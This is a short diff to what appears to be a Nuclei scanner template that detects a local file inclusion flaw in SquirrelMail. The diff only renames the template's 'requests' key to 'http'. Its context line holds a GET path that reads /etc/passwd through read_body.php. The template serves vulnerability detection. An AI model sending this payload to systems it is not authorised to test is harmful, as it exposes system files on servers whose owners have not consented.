@@ -7,7 +7,7 @@ info:
   reference: https://www.exploit-db.com/exploits/22793
   tags: lfi,squirrelmail
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&"
